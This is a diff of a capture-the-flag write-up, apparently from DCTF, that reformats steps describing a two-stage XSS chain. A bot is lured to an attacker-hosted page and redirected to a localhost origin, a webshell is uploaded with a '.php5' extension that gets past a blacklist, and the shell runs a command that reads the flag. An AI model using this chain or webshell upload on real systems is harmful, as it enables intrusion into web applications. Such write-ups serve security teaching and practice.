@@ -236,22 +236,28 @@ It took us quite a while to find the pretty simple way to bypass this.
 We are gonna use two XSS stages.
 
 1. **Make bot visit stage 1 on our server**
+
    `http://10.13.37.13/index.php?page=print&url=(base64 http://10.13.37.13.f0rki.at/stage1.html)`
 
-   **this passes the check in `admin.php` because the host is 10.13.37.13.**
+   this passes the check in `admin.php` because the host is 10.13.37.13.
 
-2. **Stage 1 html redirects to localhost xss, which loads stage 2**
+2. **Stage 1 html redirects to `127.0.0.1` origin, which loads stage 2 XSS
+   payload**, we used javascript to set `window.location` to
+
    `http://127.0.0.1/index.php?page=print&url=(base64 http://10.13.37.13.f0rki.at/stage2.html )`
 
-   **this way we change the origin back to `127.0.0.1` and are able to perfrom `POST` requests without violating the same-origin policy.**
+   this way we change the origin back to `127.0.0.1`, can execute JS in the context of the bot and are able to perfrom `POST` requests without violating the same-origin policy and bypassing the admin check.
 
-3. **Stage 2 payload makes an ajax request** to
-    `http://127.0.0.1/admin.php?page=upload` **and uploads a file.**
+3. **Stage 2 payload makes an ajax `POST` request** to
+
+    `http://127.0.0.1/admin.php?page=upload`
+
+    and uploads a file.
 
 
-But the file upload code disallowed certain file extensions:
+    But the file upload code disallowed certain file extensions:
 
-```php
+    ```php
 <?php
 [...]
 if($extension == '' || $extension == 'php' || $extension == 'htaccess'
@@ -259,14 +265,17 @@ if($extension == '' || $extension == 'php' || $extension == 'htaccess'
    || $extension == 'cpp' || $extension == 'ini' || $extension == 'html') { // fail
 [...]
 ?>
-```
+    ```
 
-Fortunately the `.php5` extension was not part of the blacklist, so we just used that.
+    Fortunately the `.php5` extension was not part of the blacklist, so we just used that.
 
-4. Uploade file with `.php5` extension and visit
+4. **Upload file with `.php5` extension** and visit
+
    `http://10.13.37.13/uploads/file_with_more_than_twelve_chars.php5`
-   to execute the webshell
-5. Executing `find / -name *flag* | xargs cat` revealed the flag in `/flag`:
+
+   to execute the webshell.
+5. **Use webshell** to execute `find / -name *flag* | xargs cat`, which revealed the flag in
+   `/flag`:**
 
    `DCTF{5a42e723159e537443b99ba7f95fbe04}`
 
